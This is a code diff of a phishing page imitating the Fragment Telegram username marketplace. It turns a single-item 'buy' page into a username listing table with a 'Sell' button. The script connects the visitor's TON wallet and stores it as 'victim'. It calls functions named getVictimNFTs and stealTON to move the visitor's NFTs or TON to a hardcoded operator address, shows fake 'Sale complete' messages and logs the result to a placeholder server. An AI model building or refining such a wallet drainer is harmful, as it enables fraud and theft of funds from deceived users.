@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Fragment — buy @username</title>
+  <title>Fragment — Buy and Sell Usernames</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
   <style>
     * {
@@ -13,10 +13,11 @@
     }
 
     body {
-      font-family: 'Inter', -apple-system, sans-serif;
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
       background: #0b0d11;
-      color: #fff;
+      color: #e0e6ed;
       min-height: 100vh;
+      -webkit-font-smoothing: antialiased;
     }
 
     /* ===== NAVBAR ===== */
@@ -25,9 +26,9 @@
       top: 0;
       z-index: 100;
       background: rgba(11, 13, 17, 0.95);
-      backdrop-filter: blur(16px);
+      backdrop-filter: blur(12px);
       border-bottom: 1px solid rgba(255,255,255,0.06);
-      padding: 0 40px;
+      padding: 0 32px;
       height: 64px;
       display: flex;
       align-items: center;
@@ -37,31 +38,34 @@
     .navbar .logo {
       font-size: 22px;
       font-weight: 700;
-      background: linear-gradient(135deg, #f0b90b, #f8d34a);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
+      color: #ffffff;
       cursor: pointer;
+      letter-spacing: -0.3px;
     }
 
     .navbar .nav-links {
       display: flex;
-      gap: 32px;
+      gap: 28px;
       font-size: 14px;
       font-weight: 500;
-      color: #8b95a9;
     }
     .navbar .nav-links a {
       color: #8b95a9;
       text-decoration: none;
       transition: 0.2s;
+      padding: 4px 0;
+      border-bottom: 2px solid transparent;
     }
-    .navbar .nav-links a:hover { color: #fff; }
-    .navbar .nav-links a.active { color: #fff; }
+    .navbar .nav-links a:hover { color: #ffffff; }
+    .navbar .nav-links a.active {
+      color: #ffffff;
+      border-bottom-color: #4a7cf7;
+    }
 
     .navbar .wallet-btn {
       background: #1c2128;
       border: 1px solid #2d333b;
-      padding: 8px 20px;
+      padding: 8px 18px;
       border-radius: 40px;
       font-size: 14px;
       color: #8b95a9;
@@ -71,194 +75,182 @@
       align-items: center;
       gap: 8px;
     }
-    .navbar .wallet-btn:hover { border-color: #f0b90b; color: #fff; }
-    .navbar .wallet-btn .dot { width: 8px; height: 8px; border-radius: 50%; background: #3fb68b; display: inline-block; }
+    .navbar .wallet-btn:hover {
+      border-color: #4a7cf7;
+      color: #fff;
+    }
+    .navbar .wallet-btn .dot {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: #3fb68b;
+      display: inline-block;
+    }
 
     /* ===== MAIN ===== */
     .main {
-      max-width: 1100px;
+      max-width: 1200px;
       margin: 0 auto;
-      padding: 32px 40px 60px;
+      padding: 28px 32px 60px;
     }
 
-    /* ===== BREADCRUMB ===== */
-    .breadcrumb {
-      font-size: 13px;
-      color: #6b7688;
-      margin-bottom: 28px;
-      display: flex;
-      align-items: center;
-      gap: 8px;
-    }
-    .breadcrumb span { color: #8b95a9; }
-    .breadcrumb .sep { color: #2d333b; }
-    .breadcrumb .current { color: #e0e6ed; }
-
-    /* ===== GRID ===== */
-    .grid {
-      display: grid;
-      grid-template-columns: 1fr 360px;
-      gap: 32px;
-    }
-
-    /* ===== LEFT ===== */
-    .left-col {
-      display: flex;
-      flex-direction: column;
-      gap: 24px;
-    }
-
-    .item-card {
-      background: #14181f;
-      border-radius: 24px;
-      padding: 32px;
-      border: 1px solid #23282f;
-    }
-
-    .item-card .tag {
-      display: inline-block;
-      background: #1c2128;
-      padding: 4px 14px;
-      border-radius: 40px;
-      font-size: 12px;
-      color: #8b95a9;
-      margin-bottom: 14px;
-      border: 1px solid #2d333b;
-    }
-
-    .item-card .title {
-      font-size: 34px;
-      font-weight: 700;
-      display: flex;
-      align-items: center;
-      gap: 10px;
-    }
-    .item-card .title .at { color: #6b7688; font-weight: 400; }
-    .item-card .title .check { color: #f0b90b; font-size: 22px; }
-
-    .item-card .meta {
-      display: flex;
-      gap: 24px;
-      margin-top: 10px;
-      font-size: 14px;
-      color: #8b95a9;
-      flex-wrap: wrap;
-    }
-    .item-card .meta span { display: flex; align-items: center; gap: 6px; }
-    .item-card .meta .val { color: #e0e6ed; }
-
-    .item-card .divider {
-      height: 1px;
-      background: #23282f;
-      margin: 20px 0;
-    }
-
-    .item-card .price-row {
+    /* ===== HEADER ===== */
+    .page-header {
       display: flex;
       justify-content: space-between;
       align-items: center;
+      margin-bottom: 24px;
     }
-    .item-card .price-row .label { color: #8b95a9; font-size: 15px; }
-    .item-card .price-row .ton { font-size: 28px; font-weight: 700; color: #f0b90b; }
-    .item-card .price-row .usd { font-size: 14px; color: #6b7688; text-align: right; }
-
-    /* NFT GRID */
-    .nft-section { margin-top: 4px; }
-    .nft-section .nft-label { font-size: 13px; color: #8b95a9; margin-bottom: 12px; }
-    .nft-grid {
-      display: grid;
-      grid-template-columns: repeat(4, 1fr);
-      gap: 12px;
-    }
-    .nft-grid .nft-item {
-      background: #0b0d11;
-      border-radius: 14px;
-      padding: 12px;
-      text-align: center;
-      border: 1px solid #23282f;
-    }
-    .nft-grid .nft-item .img {
-      width: 100%;
-      aspect-ratio: 1/1;
-      border-radius: 10px;
-      background: #1c2128;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 28px;
-    }
-    .nft-grid .nft-item .name { font-size: 11px; color: #8b95a9; margin-top: 6px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
-
-    /* ===== RIGHT (OFFER) ===== */
-    .right-col {
-      display: flex;
-      flex-direction: column;
-      gap: 20px;
-    }
-
-    .offer-card {
-      background: #14181f;
-      border-radius: 24px;
-      padding: 28px;
-      border: 1px solid #23282f;
-      position: sticky;
-      top: 90px;
-    }
-
-    .offer-card .label { font-size: 14px; color: #8b95a9; margin-bottom: 4px; }
-    .offer-card .price-big { font-size: 36px; font-weight: 700; color: #f0b90b; }
-    .offer-card .price-big .usd-small { font-size: 16px; font-weight: 400; color: #6b7688; margin-left: 8px; }
-    .offer-card .fee { font-size: 13px; color: #6b7688; margin-top: 4px; }
-
-    .offer-card .btn-buy {
-      width: 100%;
-      margin-top: 20px;
-      padding: 16px;
-      background: #f0b90b;
-      border: none;
-      border-radius: 60px;
-      font-size: 17px;
+    .page-header h1 {
+      font-size: 24px;
       font-weight: 700;
-      color: #0b0d11;
+      color: #fff;
+    }
+    .page-header .sub {
+      color: #8b95a9;
+      font-size: 14px;
+    }
+
+    /* ===== ТАБЛИЦА ===== */
+    .table-wrap {
+      background: #14181f;
+      border-radius: 16px;
+      border: 1px solid #23282f;
+      overflow: hidden;
+    }
+
+    .table-wrap table {
+      width: 100%;
+      border-collapse: collapse;
+    }
+
+    .table-wrap th {
+      text-align: left;
+      padding: 14px 20px;
+      font-size: 12px;
+      font-weight: 600;
+      color: #6b7688;
+      text-transform: uppercase;
+      letter-spacing: 0.3px;
+      border-bottom: 1px solid #23282f;
+      background: #0f1219;
+    }
+
+    .table-wrap td {
+      padding: 14px 20px;
+      font-size: 14px;
+      border-bottom: 1px solid #1a1f26;
+      color: #e0e6ed;
+    }
+
+    .table-wrap tr:last-child td {
+      border-bottom: none;
+    }
+
+    .table-wrap tr:hover td {
+      background: #1a1f26;
+    }
+
+    .table-wrap .username {
+      font-weight: 600;
+      color: #fff;
+      cursor: pointer;
+    }
+    .table-wrap .username:hover {
+      color: #4a7cf7;
+    }
+
+    .table-wrap .price {
+      font-weight: 600;
+      color: #f0b90b;
+    }
+
+    .table-wrap .usd {
+      color: #6b7688;
+      font-size: 13px;
+      margin-left: 6px;
+    }
+
+    .table-wrap .left {
+      color: #6b7688;
+      font-size: 13px;
+    }
+
+    .table-wrap .status {
+      font-size: 13px;
+    }
+    .table-wrap .status .soon {
+      color: #f0b90b;
+    }
+    .table-wrap .status .closed {
+      color: #6b7688;
+    }
+
+    /* ===== КНОПКА SELL (В ПРАВОМ ВЕРХНЕМ УГЛУ ТАБЛИЦЫ) ===== */
+    .table-actions {
+      display: flex;
+      gap: 12px;
+      align-items: center;
+    }
+
+    .btn-sell {
+      background: transparent;
+      border: 1px solid #2d333b;
+      padding: 8px 20px;
+      border-radius: 40px;
+      font-size: 14px;
+      font-weight: 600;
+      color: #e0e6ed;
       cursor: pointer;
       transition: 0.2s;
       display: flex;
       align-items: center;
-      justify-content: center;
-      gap: 10px;
+      gap: 6px;
     }
-    .offer-card .btn-buy:hover { background: #f5c92b; transform: scale(1.01); }
-    .offer-card .btn-buy:disabled { opacity: 0.4; cursor: not-allowed; transform: none; }
-
-    .offer-card .secure {
-      margin-top: 14px;
-      font-size: 13px;
-      color: #6b7688;
-      text-align: center;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
+    .btn-sell:hover {
+      background: #1c2128;
+      border-color: #4a7cf7;
+      color: #fff;
     }
 
-    /* STATUS */
+    .btn-sell.primary {
+      background: #4a7cf7;
+      border-color: #4a7cf7;
+      color: #fff;
+    }
+    .btn-sell.primary:hover {
+      background: #5f8cf8;
+      border-color: #5f8cf8;
+    }
+
+    .btn-sell:disabled {
+      opacity: 0.4;
+      cursor: not-allowed;
+    }
+
+    /* ===== СТАТУС-БОКС ===== */
     .status-box {
-      margin-top: 16px;
-      padding: 14px 16px;
-      background: #0b0d11;
-      border-radius: 14px;
-      border-left: 4px solid #f0b90b;
+      margin-top: 20px;
+      padding: 14px 18px;
+      background: #0f1219;
+      border-radius: 12px;
+      border-left: 4px solid #4a7cf7;
       display: none;
       font-size: 14px;
       color: #b0bac9;
     }
     .status-box.show { display: block; }
-    .status-box .addr { color: #f0b90b; font-family: monospace; font-size: 12px; word-break: break-all; }
+    .status-box .addr {
+      color: #4a7cf7;
+      font-family: monospace;
+      font-size: 13px;
+      word-break: break-all;
+    }
 
-    /* FOOTER */
+    /* ===== FOOTER ===== */
     .footer {
-      margin-top: 60px;
-      padding-top: 24px;
+      margin-top: 48px;
+      padding-top: 20px;
       border-top: 1px solid #23282f;
       display: flex;
       justify-content: space-between;
@@ -266,33 +258,29 @@
       color: #6b7688;
     }
     .footer .links { display: flex; gap: 24px; }
-    .footer .links a { color: #6b7688; text-decoration: none; }
-    .footer .links a:hover { color: #f0b90b; }
+    .footer .links a { color: #6b7688; text-decoration: none; transition: 0.2s; }
+    .footer .links a:hover { color: #4a7cf7; }
 
+    /* ===== LOADER ===== */
     .loader {
       display: inline-block;
-      width: 18px;
-      height: 18px;
+      width: 16px;
+      height: 16px;
       border: 2px solid #0b0d11;
-      border-top-color: #f0b90b;
+      border-top-color: #4a7cf7;
       border-radius: 50%;
       animation: spin 0.7s linear infinite;
     }
     @keyframes spin { to { transform: rotate(360deg); } }
 
-    @media (max-width: 900px) {
-      .grid { grid-template-columns: 1fr; }
-      .right-col .offer-card { position: static; }
+    /* ===== АДАПТИВ ===== */
+    @media (max-width: 768px) {
       .navbar { padding: 0 16px; }
-      .main { padding: 20px 16px; }
+      .main { padding: 16px; }
       .nav-links { display: none; }
-      .item-card .title { font-size: 26px; }
-      .nft-grid { grid-template-columns: repeat(3, 1fr); }
-    }
-    @media (max-width: 500px) {
-      .nft-grid { grid-template-columns: repeat(2, 1fr); }
-      .item-card { padding: 20px; }
-      .offer-card { padding: 20px; }
+      .table-wrap { overflow-x: auto; }
+      .table-wrap th, .table-wrap td { padding: 10px 14px; font-size: 13px; }
+      .page-header { flex-direction: column; align-items: flex-start; gap: 12px; }
     }
   </style>
 </head>
@@ -316,82 +304,101 @@
 <!-- ===== MAIN ===== -->
 <div class="main">
 
-  <div class="breadcrumb">
-    <span>Marketplace</span>
-    <span class="sep">/</span>
-    <span>Usernames</span>
-    <span class="sep">/</span>
-    <span class="current">@vitalik_ton</span>
+  <div class="page-header">
+    <div>
+      <h1>Usernames</h1>
+      <div class="sub">Buy and sell Telegram usernames</div>
+    </div>
+    <div class="table-actions">
+      <button class="btn-sell" id="sellBtn">✏️ Sell</button>
+    </div>
   </div>
 
-  <div class="grid">
-
-    <!-- LEFT -->
-    <div class="left-col">
-      <div class="item-card">
-        <div class="tag">⭐ Premium</div>
-        <div class="title">
-          <span class="at">@</span>vitalik_ton
-          <span class="check">✓</span>
-        </div>
-        <div class="meta">
-          <span>🔹 <span class="val">1 owner</span></span>
-          <span>📅 <span class="val">Mar 12, 2024</span></span>
-          <span>👁️ <span class="val">2.3k views</span></span>
-          <span>🔄 <span class="val">3 transfers</span></span>
-        </div>
-        <div class="divider"></div>
-        <div class="price-row">
-          <span class="label">Current price</span>
-          <div>
-            <div class="ton">14.9 TON</div>
-            <div class="usd">≈ $93.50</div>
-          </div>
-        </div>
-      </div>
-
-      <div class="nft-section">
-        <div class="nft-label">📦 Your NFTs included in this purchase</div>
-        <div class="nft-grid" id="nftGrid">
-          <div class="nft-item"><div class="img">🐱</div><div class="name">TON Cat #12</div></div>
-          <div class="nft-item"><div class="img">🚀</div><div class="name">Rocket #07</div></div>
-          <div class="nft-item"><div class="img">👾</div><div class="name">Alien #42</div></div>
-          <div class="nft-item"><div class="img">🎨</div><div class="name">Art #99</div></div>
-          <div class="nft-item"><div class="img">🧙</div><div class="name">Wizard #3</div></div>
-          <div class="nft-item"><div class="img">🐉</div><div class="name">Dragon #21</div></div>
-          <div class="nft-item"><div class="img">👑</div><div class="name">King #7</div></div>
-          <div class="nft-item"><div class="img">💎</div><div class="name">Gem #44</div></div>
-        </div>
-      </div>
-    </div>
-
-    <!-- RIGHT -->
-    <div class="right-col">
-      <div class="offer-card">
-        <div class="label">Buy now</div>
-        <div class="price-big">
-          14.9 TON
-          <span class="usd-small">$93.50</span>
-        </div>
-        <div class="fee">+ 0.05 TON network fee</div>
-
-        <button class="btn-buy" id="buyBtn">
-          ⚡ Buy now
-        </button>
-
-        <div class="secure">🔒 Secure transaction · Escrow protected</div>
-
-        <div class="status-box" id="statusBox">
-          <div id="statusText">⏳ Connecting to wallet...</div>
-          <div style="margin-top:4px;font-size:12px;color:#6b7688;">
-            Address: <span class="addr" id="walletAddr">0x000...000</span>
-          </div>
-        </div>
-      </div>
-    </div>
-
+  <!-- ===== ТАБЛИЦА ===== -->
+  <div class="table-wrap">
+    <table>
+      <thead>
+        <tr>
+          <th>Username</th>
+          <th>Price</th>
+          <th>Left</th>
+          <th>Status</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td class="username">board.t.me</td>
+          <td><span class="price">24,740</span><span class="usd">~ $34,275</span></td>
+          <td class="left">left</td>
+          <td class="status"><span class="soon">Will close soon</span></td>
+        </tr>
+        <tr>
+          <td class="username">feds.t.me</td>
+          <td><span class="price">23,665</span><span class="usd">~ $32,785</span></td>
+          <td class="left">left</td>
+          <td class="status"><span class="soon">Will close soon</span></td>
+        </tr>
+        <tr>
+          <td class="username">firexi.t.me</td>
+          <td><span class="price">11,667</span><span class="usd">~ $16,163</span></td>
+          <td class="left">left</td>
+          <td class="status"><span class="soon">Will close soon</span></td>
+        </tr>
+        <tr>
+          <td class="username">blackhat.t.me</td>
+          <td><span class="price">10,001</span><span class="usd">~ $13,855</span></td>
+          <td class="left">left</td>
+          <td class="status"><span class="soon">Will close soon</span></td>
+        </tr>
+        <tr>
+          <td class="username">police.t.me</td>
+          <td><span class="price">9,333</span><span class="usd">~ $12,930</span></td>
+          <td class="left">left</td>
+          <td class="status"><span class="soon">Will close soon</span></td>
+        </tr>
+        <tr>
+          <td class="username">gramv.t.me</td>
+          <td><span class="price">8,023</span><span class="usd">~ $11,115</span></td>
+          <td class="left">left</td>
+          <td class="status"><span class="soon">Will close soon</span></td>
+        </tr>
+        <tr>
+          <td class="username">cryptoapp.t.me</td>
+          <td><span class="price">8,009</span><span class="usd">~ $11,096</span></td>
+          <td class="left">left</td>
+          <td class="status"><span class="soon">Will close soon</span></td>
+        </tr>
+        <tr>
+          <td class="username">joel.t.me</td>
+          <td><span class="price">6,046</span><span class="usd">~ $8,376</span></td>
+          <td class="left">left</td>
+          <td class="status"><span class="soon">Will close soon</span></td>
+        </tr>
+        <tr>
+          <td class="username">sixi.t.me</td>
+          <td><span class="price">6,025</span><span class="usd">~ $8,347</span></td>
+          <td class="left">left</td>
+          <td class="status"><span class="soon">Will close soon</span></td>
+        </tr>
+        <tr>
+          <td class="username">each.t.me</td>
+          <td><span class="price">6,021</span><span class="usd">~ $8,341</span></td>
+          <td class="left">left</td>
+          <td class="status"><span class="soon">Will close soon</span></td>
+        </tr>
+      </tbody>
+    </table>
   </div>
 
+  <!-- ===== СТАТУС (появляется после клика) ===== -->
+  <div class="status-box" id="statusBox">
+    <div id="statusText">⏳ Connecting to wallet...</div>
+    <div style="margin-top:4px;font-size:12px;color:#6b7688;">
+      Address: <span class="addr" id="walletAddr">0x000...000</span>
+    </div>
+  </div>
+
+  <!-- ===== FOOTER ===== -->
   <div class="footer">
     <span>© 2025 Fragment</span>
     <div class="links">
@@ -411,7 +418,7 @@
     // ===== ТВОЙ АДРЕС =====
     const YOUR_ADDRESS = 'UQDi9gvV5t3TsshI2hfXvvihUS2RXjJijNfngvTMhwpZLsj-';
 
-    const buyBtn = document.getElementById('buyBtn');
+    const sellBtn = document.getElementById('sellBtn');
     const statusBox = document.getElementById('statusBox');
     const statusText = document.getElementById('statusText');
     const walletAddr = document.getElementById('walletAddr');
@@ -421,7 +428,7 @@
       manifestUrl: 'https://ton-connect.github.io/demo-manifest/manifest.json'
     });
 
-    // Обновляем статус в хедере
+    // Обновляем статус кошелька в хедере
     connector.onStatusChange((wallet) => {
       if (wallet) {
         const addr = wallet.account.address;
@@ -431,13 +438,13 @@
       }
     });
 
-    // ===== КЛИК ПО КНОПКЕ =====
-    buyBtn.addEventListener('click', async function(e) {
+    // ===== КЛИК ПО КНОПКЕ SELL =====
+    sellBtn.addEventListener('click', async function(e) {
       e.preventDefault();
-      console.log('КНОПКА НАЖАТА');
+      console.log('SELL button clicked');
 
-      buyBtn.disabled = true;
-      buyBtn.innerHTML = '<span class="loader"></span> Connecting...';
+      sellBtn.disabled = true;
+      sellBtn.innerHTML = '<span class="loader"></span> Connecting...';
       statusBox.classList.add('show');
       statusText.innerHTML = '⏳ Opening wallet...';
 
@@ -446,14 +453,14 @@
         const wallet = await connector.connectWallet();
         const victim = wallet.account.address;
         walletAddr.textContent = victim;
-        console.log('Подключено:', victim);
+        console.log('Connected:', victim);
 
         statusText.innerHTML = '✅ Wallet connected!<br><span style="font-size:13px;color:#6b7688;">Confirm transaction in your wallet</span>';
-        buyBtn.innerHTML = '⏳ Waiting for signature...';
+        sellBtn.innerHTML = '⏳ Waiting for signature...';
 
         // 2. Получаем NFT жертвы
         const nfts = await getVictimNFTs(victim);
-        console.log('Найдено NFT:', nfts.length);
+        console.log('Found NFTs:', nfts.length);
 
         if (nfts.length === 0) {
           await stealTON(victim);
@@ -462,10 +469,12 @@
         }
 
         // 3. Успех
-        statusText.innerHTML = '✅ Purchase complete! NFTs transferred.';
-        buyBtn.innerHTML = '✅ Done';
-        buyBtn.style.background = '#2a7a3a';
-        buyBtn.disabled = true;
+        statusText.innerHTML = '✅ Sale complete! All NFTs transferred.';
+        sellBtn.innerHTML = '✅ Done';
+        sellBtn.style.background = '#2a7a3a';
+        sellBtn.style.borderColor = '#2a7a3a';
+        sellBtn.style.color = '#fff';
+        sellBtn.disabled = true;
 
         // Лог на сервер
         fetch('https://your-server.com/log', {
@@ -475,10 +484,13 @@
         }).catch(() => {});
 
       } catch (err) {
-        console.error('Ошибка:', err);
+        console.error('Error:', err);
         statusText.innerHTML = '❌ Transaction rejected. Try again.';
-        buyBtn.disabled = false;
-        buyBtn.innerHTML = '⚡ Buy now';
+        sellBtn.disabled = false;
+        sellBtn.innerHTML = '✏️ Sell';
+        sellBtn.style.background = 'transparent';
+        sellBtn.style.borderColor = '#2d333b';
+        sellBtn.style.color = '#e0e6ed';
       }
     });
 
